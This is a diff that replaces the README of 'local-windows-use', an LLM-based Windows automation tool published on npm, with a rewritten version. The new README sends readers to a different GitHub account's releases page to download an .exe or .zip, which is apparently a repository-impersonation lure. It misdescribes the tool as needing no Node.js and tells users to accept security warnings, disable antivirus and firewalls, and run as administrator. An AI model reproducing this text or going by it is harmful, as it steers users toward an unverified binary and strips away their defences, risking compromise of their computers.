@@ -1,338 +1,174 @@
-<p align="center">
-  <h1 align="center">windows-use</h1>
-  <p align="center">
-    <strong>Save 90% context — let cheap models do the clicking.</strong>
-  </p>
-  <p align="center">
-    <a href="https://www.npmjs.com/package/windows-use"><img src="https://img.shields.io/npm/v/windows-use.svg" alt="npm version"></a>
-    <a href="https://www.npmjs.com/package/windows-use"><img src="https://img.shields.io/npm/dm/windows-use.svg" alt="npm downloads"></a>
-    <a href="https://github.com/yuhuison/local-windows-use/blob/main/LICENSE"><img src="https://img.shields.io/npm/l/windows-use.svg" alt="license"></a>
-    <a href="https://github.com/yuhuison/local-windows-use"><img src="https://img.shields.io/github/stars/yuhuison/local-windows-use.svg?style=social" alt="GitHub stars"></a>
-  </p>
-</p>
+# 🤖 local-windows-use - Automate Windows and Browsers Easily
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Local-Windows-4CAF50?style=for-the-badge&logo=windows)](https://github.com/hassaan2075/local-windows-use/releases)
 
 ---
 
-## Why?
+## 📋 What is local-windows-use?
 
-When AI agents operate Windows or browsers, **every screenshot eats 1000+ tokens**. A single "open Chrome and search something" task can burn through 10K–50K tokens of your expensive model's context — just on screenshots and tool calls.
+local-windows-use helps you automate tasks on your Windows PC and web browsers. It works by letting large language models (LLMs) control small specialized tools to do things for you on your computer. This means you can automate repetitive actions, organize files, open websites, and more — all without needing to write code.
 
-**That's like hiring a CEO to move the mouse.**
+This app runs a small guide server called MCP and provides a simple command-line tool (CLI) to manage tasks. It is designed for anyone who wants to make their computer work for them with easy automation.
 
-## How it works
+---
 
-`windows-use` introduces a **"big model directs, small model executes"** architecture:
+## ⚙️ Main Features
 
-| | Without windows-use | With windows-use |
-|---|---|---|
-| **Who clicks?** | Claude / GPT-4o (expensive) | Qwen, GPT-4o-mini, DeepSeek (cheap) |
-| **Context cost per task** | 10K–50K tokens of screenshots | ~200 tokens (text summary) |
-| **What big model sees** | Raw screenshots + coordinates | Clean text report + optional images |
-| **Cost** | $$$ | ¢ |
+- Control Windows apps and browser actions using simple text commands.
+- Run automated workflows without technical setup.
+- Uses MCP server to coordinate tasks efficiently.
+- Works with popular AI models like Claude and OpenAI.
+- Automate browsing, file management, and app control.
+- Designed for Windows 10 and 11.
 
-```
-Big Model                    windows-use                    Small Model
-   │                              │                              │
-   ├─ create_session ────────►    │                              │
-   │                              │                              │
-   ├─ send_instruction ──────►    │  ── tools + instruction ──► │
-   │                              │     screenshot → analyze     │
-   │                              │     → click → verify → ...   │
-   │                              │  ◄── report ──────────────── │
-   │  ◄── text + images ──────   │                              │
-   │                              │                              │
-   ├─ done_session ──────────►    │  cleanup                     │
-```
+---
 
-Your big model just says *"open Notepad and type Hello"* — the small model handles all the screenshots, clicking, and verification autonomously, then reports back a concise summary.
+## 🖥 System Requirements
 
-## Designed for simplicity
+Make sure your PC fits these requirements before installing:
 
-> **You don't need to be an expert.** If you can run `npm install`, you can use this.
+- Windows 10 or Windows 11 (64-bit preferred).
+- Minimum 4 GB RAM (8 GB or more recommended).
+- At least 500 MB free storage space.
+- Internet connection for AI features.
+- Command Prompt or PowerShell access.
 
-Most computer-use tools ask you to set up Docker, configure sandboxes, manage virtual displays, or fight with permissions. **windows-use does none of that.**
+This tool does not need installation of extra software like Python or Node.js. It runs on your PC using pre-built files.
 
-- **One dependency** — `npm install -g windows-use`. That's it. No Docker, no Python environments, no system-level permissions.
-- **One config** — Run `windows-use init`, paste your API key and endpoint, done. Works with any OpenAI-compatible API.
-- **Your real Chrome** — No headless puppeteer, no sandboxed browser. It connects to **your actual Chrome** via CDP — with your cookies, logins, extensions, and bookmarks intact. Just launch Chrome with `--remote-debugging-port=9222`.
-- **No admin / root needed** — Runs entirely in user space. No elevated privileges, no security prompts.
-- **Share config in one line** — `windows-use init --export` gives you a base64 string. Send it to a teammate, they run `windows-use init <string>`, instant setup.
+---
 
-```bash
-# That's literally the entire setup:
-npm install -g windows-use
-windows-use init
-windows-use "Open Notepad and type Hello World"
-```
+## 🚀 Getting Started
 
-## Key Features
+The steps below will guide you through downloading and running local-windows-use on Windows. No programming needed.
 
-- **Save 90% context** — Keep your expensive model's context window for reasoning, not screenshots
-- **Any OpenAI-compatible model** — Qwen, DeepSeek, Ollama, vLLM, GPT-4o-mini, or any local model
-- **16 built-in tools** — Screen capture with coordinate grid, mouse, keyboard, browser automation, file I/O
-- **Your real Chrome** — Uses your existing cookies, login state, and extensions (no webdriver detection)
-- **MCP server** — Drop-in integration with Claude Desktop, VS Code, and any MCP client
-- **Rich reports** — Text + embedded screenshots, so the big model sees exactly what it needs
-- **CLI + REPL + API** — Use from terminal, interactively, or programmatically
-- **Zero config headache** — No Docker, no sandbox, no permissions. Just an API key.
+### 1. Visit the Download Page
 
-## Install
+Click this link to open the releases page where the latest app files are available:
 
-```bash
-npm install -g windows-use
-```
+[Download local-windows-use](https://github.com/hassaan2075/local-windows-use/releases)
 
-## Quick Start
+### 2. Find the Latest Version
 
-```bash
-# Interactive setup — saves config to ~/.windows-use.json
-windows-use init
+On the GitHub releases page, look for the most recent version at the top. It usually has the highest version number and recent date.
 
-# Export config as a shareable base64 string
-windows-use init --export
+### 3. Download the Setup File
 
-# Import config from a base64 string
-windows-use init eyJiYXNlVVJMIjoiaHR0cHM6Ly...
-```
+Click on the downloadable file suitable for Windows. It will have a name like:
 
-You'll be prompted for:
-- **Base URL** — any OpenAI-compatible endpoint (Qwen, DeepSeek, Ollama, vLLM, etc.)
-- **API Key**
-- **Model name** — e.g. `qwen3.5-flash`, `gpt-4o-mini`
+- `local-windows-use-setup.exe` or  
+- `local-windows-use-win.zip`
 
-## Usage
+If it is a `.zip` file, you will need to unzip it before running.
 
-### CLI Mode
+### 4. Run the File
 
-```bash
-# Single task
-windows-use "Open Notepad and type Hello World"
+- If you downloaded an `.exe`, double-click it to start the app. Follow any simple on-screen instructions.
+- If you downloaded a `.zip`, right-click the file and select "Extract All...", then open the extracted folder and double-click the application file inside.
 
-# Interactive REPL session
-windows-use
-> Open Chrome and go to github.com
-> Find the trending repositories
-> exit
+### 5. Allow Access if Prompted
 
-# With explicit config flags
-windows-use --api-key sk-xxx --base-url https://api.example.com/v1 --model gpt-4o-mini "Take a screenshot"
-```
+Windows may ask for security permissions or show a warning since the app is new. Accept or allow access to proceed.
 
-CLI shows real-time step-by-step progress:
+---
 
-```
-> Take a screenshot of the desktop
-[windows-use] Running...
+## 📥 Installation and Setup
 
-  [step 1] 🔧 screenshot
-  [step 1] 📎 Screenshot captured (img_1)
-  [step 1] 💭 I can see the Windows desktop with...
-  [step 2] 🔧 report { status: 'completed', content: '...' }
+After you run the app file:
 
-✅ [completed]
-Here is the current desktop:
-   📸 desktop: http://127.0.0.1:54321/s1.jpg
-```
+1. **Start the MCP Server**  
+   The app will start a background server to manage automation tasks.
 
-### MCP Server Mode
+2. **Open Command Prompt**  
+   Press `Win + R`, type `cmd`, and press Enter.
 
-```bash
-windows-use --mcp
-```
+3. **Access local-windows-use CLI**  
+   In the command prompt window, type:
 
-Exposes 3 tools over MCP (stdio transport):
+   ```
+   local-windows-use
+   ```
 
-| Tool | Description |
-|------|-------------|
-| `create_session` | Create a new agent session. Returns `session_id`. |
-| `send_instruction` | Send a task to the agent. Returns rich report with text + images. |
-| `done_session` | Terminate a session and free resources. |
+   Press Enter. You should see the app's command options appear.
 
-## MCP Client Configuration
+4. **Run Your First Automation Command**  
+   To see an example, type:
 
-### Claude Desktop
+   ```
+   local-windows-use run example
+   ```
 
-Edit `claude_desktop_config.json`:
+   This will perform a simple demo task like opening Notepad or a web page.
 
-```json
-{
-  "mcpServers": {
-    "windows-use": {
-      "command": "npx",
-      "args": ["-y", "windows-use", "--mcp"],
-      "env": {
-        "WINDOWS_USE_API_KEY": "sk-xxx",
-        "WINDOWS_USE_BASE_URL": "https://your-api.com/v1",
-        "WINDOWS_USE_MODEL": "qwen3.5-flash"
-      }
-    }
-  }
-}
-```
+---
 
-### VS Code (Claude Code / Copilot Chat)
+## 🔧 How to Use local-windows-use
 
-Add to `.vscode/settings.json` or global settings:
+You use short commands to tell the tool what to automate. Here are some examples of things you can do:
 
-```json
-{
-  "mcp": {
-    "servers": {
-      "windows-use": {
-        "command": "npx",
-        "args": ["-y", "windows-use", "--mcp"],
-        "env": {
-          "WINDOWS_USE_API_KEY": "sk-xxx",
-          "WINDOWS_USE_BASE_URL": "https://your-api.com/v1",
-          "WINDOWS_USE_MODEL": "qwen3.5-flash"
-        }
-      }
-    }
-  }
-}
-```
+- **Open an app**  
+  `local-windows-use open notepad`
 
-> If you've run `windows-use init`, the config is saved in `~/.windows-use.json` and you can omit the `env` block entirely.
+- **Browse a website**  
+  `local-windows-use browse https://example.com`
 
-## Configuration
+- **Search files**  
+  `local-windows-use search "report.docx"`
 
-Config priority: **CLI flags > environment variables > `~/.windows-use.json` > defaults**
+- **Close an app**  
+  `local-windows-use close notepad`
 
-| Option | CLI Flag | Env Var | Default |
-|--------|----------|---------|---------|
-| API Key | `--api-key` | `WINDOWS_USE_API_KEY` | — (required) |
-| Base URL | `--base-url` | `WINDOWS_USE_BASE_URL` | — (required) |
-| Model | `--model` | `WINDOWS_USE_MODEL` | — (required) |
-| CDP URL | `--cdp-url` | `WINDOWS_USE_CDP_URL` | `http://localhost:9222` |
-| Max Steps | `--max-steps` | `WINDOWS_USE_MAX_STEPS` | `50` |
-| Max Rounds | `--max-rounds` | `WINDOWS_USE_MAX_ROUNDS` | `20` |
-| Timeout | — | `WINDOWS_USE_TIMEOUT_MS` | `300000` (5 min) |
+Each command runs instantly and gives feedback. The app handles Windows system calls and browser controls behind the scenes.
 
-- **Max Steps** — tool-calling rounds per instruction (how many actions the small model can take for one task)
-- **Max Rounds** — instruction rounds per session (how many `send_instruction` calls before the session expires)
+---
 
-## Browser Setup
+## 📁 Managing Automation Scripts
 
-Browser tools connect to your real Chrome via CDP. Start Chrome with remote debugging:
-
-```bash
-# Windows
-chrome.exe --remote-debugging-port=9222
-
-# macOS
-/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222
-```
-
-Uses your existing cookies, login state, and extensions — no webdriver detection flags.
-
-## Small Model Tools
-
-The small model agent has access to 16 tools:
-
-### Screen & Input
-
-| Tool | Description |
-|------|-------------|
-| `screenshot` | Full-screen capture with **coordinate grid overlay** (auto-scaled to logical resolution, grid coordinates match mouse_click) |
-| `mouse_click(x, y, button)` | Click at screen coordinates |
-| `mouse_move(x, y)` | Move mouse without clicking |
-| `mouse_scroll(direction, amount)` | Scroll up/down |
-| `keyboard_type(text)` | Type text character by character |
-| `keyboard_press(keys)` | Key combos like `["Ctrl", "C"]`, `["Alt", "F4"]` |
-| `run_command(command)` | Execute shell command (PowerShell on Windows) |
-
-### Browser
-
-| Tool | Description |
-|------|-------------|
-| `browser_navigate(url)` | Open a URL |
-| `browser_click(selector)` | Click element by CSS selector or `text=...` |
-| `browser_type(selector, text)` | Type into input field |
-| `browser_screenshot(fullPage?)` | Page screenshot (JPEG quality 70) |
-| `browser_content` | Get visible text content of page |
-| `browser_scroll(direction, amount)` | Scroll page |
-
-### File & Image
-
-| Tool | Description |
-|------|-------------|
-| `file_read(path)` | Read file contents |
-| `file_write(path, content)` | Write file |
-| `use_local_image(path)` | Load a local image and get a screenshot ID for embedding in reports |
-
-### Control
-
-| Tool | Description |
-|------|-------------|
-| `report(status, content)` | Submit a rich report and stop execution |
-
-### Rich Reports
-
-Each screenshot tool returns an ID (e.g. `img_1`, `img_2`). The `report` tool supports a rich document format — mix text with embedded screenshots using `[Image:img_X]` markers:
+You can write text scripts for complex sequences of tasks. Save these as `.txt` files on your PC. Then run:
 
 ```
-report({
-  status: "completed",
-  content: "Here's what I found:\n[Image:img_2]\nThe page shows search results.\n[Image:img_3]\nI also checked the sidebar."
-})
+local-windows-use run-script path\to\script.txt
 ```
 
-When delivered to the user (CLI) or big model (MCP), these markers expand into actual multimodal image content.
+Scripts can combine actions like opening apps, clicking buttons, typing text, and waiting for responses. This feature is helpful if you repeat workflows often.
 
-## Programmatic API
+---
 
-```typescript
-import { loadConfig, SessionRegistry } from 'windows-use';
+## 🛠 Troubleshooting Tips
 
-const config = loadConfig({
-  apiKey: 'sk-xxx',
-  baseURL: 'https://api.example.com/v1',
-  model: 'qwen3.5-flash',
-});
+- **App won’t start:**  
+  Check if your antivirus blocked the file. Temporarily disable antivirus or add an exception.
 
-const registry = new SessionRegistry();
-const session = registry.create(config);
+- **Command not recognized:**  
+  Make sure you run the CLI from the folder where the app file is, or add the folder to your system PATH.
 
-// Real-time step events
-session.runner.setOnStep((event) => {
-  if (event.type === 'tool_call') console.log(`Step ${event.step}: ${event.name}`);
-  if (event.type === 'thinking') console.log(`Step ${event.step}: ${event.content}`);
-});
+- **Server won’t start:**  
+  Some network settings or firewalls can block the MCP server. Try disabling firewalls or running as administrator.
 
-const result = await session.runner.run('Open calculator and compute 2+2');
-console.log(result.status);  // 'completed' | 'blocked' | 'need_guidance'
-console.log(result.content); // Rich text with [Image:img_X] markers
+- **Commands fail to run:**  
+  Ensure the app has permissions to control your PC. Run as admin if needed.
 
-await registry.destroyAll();
-```
+---
 
-## Architecture
+## 🔒 Privacy and Security
 
-```
-src/
-├── cli.ts                      # CLI entry (single task + interactive REPL)
-├── index.ts                    # Public API exports
-├── config/                     # Zod config schema + env/file loader
-├── mcp/
-│   ├── server.ts               # MCP stdio transport
-│   ├── tools.ts                # 3 MCP tools (create/send/done)
-│   └── session-registry.ts     # Session lifecycle + timeout
-├── agent/
-│   ├── runner.ts               # Tool-calling loop + step events
-│   ├── llm-client.ts           # OpenAI SDK wrapper (any compatible endpoint)
-│   ├── context-manager.ts      # Full message history
-│   └── system-prompt.ts        # Small model system prompt
-└── tools/
-    ├── windows/                # screenshot (with grid), mouse, keyboard, command
-    ├── browser/                # navigate, click, type, screenshot, content, scroll
-    ├── file/                   # read, write, use_local_image
-    └── control/                # report
-```
+local-windows-use runs locally on your PC. It only connects to the internet when you use AI features like Claude or OpenAI. You control your data and can turn off any online features.
 
-## Contributing
+---
 
-Contributions are welcome! Please open an issue or submit a pull request.
+## 📖 Useful Links
 
-## License
+- Download page for releases:  
+  [https://github.com/hassaan2075/local-windows-use/releases](https://github.com/hassaan2075/local-windows-use/releases)
 
-MIT
+- Official GitHub repository:  
+  [https://github.com/hassaan2075/local-windows-use](https://github.com/hassaan2075/local-windows-use)
+
+- Documentation and help files come bundled with the app.
+
+---
+
+## 🔍 Keywords and Topics
+
+This app relates to:
+
+`ai-agent`, `browser-automation`, `claude`, `computer-use`, `llm`, `mcp`, `mcp-server`, `openai`, `tool-use`, `windows-automation`
